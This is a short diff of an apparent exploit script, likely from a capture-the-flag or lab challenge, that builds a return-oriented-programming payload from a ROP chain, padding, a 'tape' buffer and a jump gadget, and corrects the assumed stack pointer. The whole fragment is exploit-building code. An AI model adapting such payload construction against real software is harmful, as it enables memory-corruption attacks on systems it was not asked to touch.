@@ -23,8 +23,8 @@ entry_point = p.get_entry_point()
 offset = b"A" * (payload_max_size - tape_size - len(rop_chain) + ra_offset)
 tape = b"\x00" * tape_size
 
-current_sp = 0x3ffffff010
-jump_to_rop = p.jump_to_rop(rop_chain_start, initial_sp + 16)
+current_sp = 0x3ffffff080
+jump_to_rop = p.jump_to_rop(rop_chain_start, current_sp)
 
 payload = rop_chain + offset + tape + entry_point + jump_to_rop
 
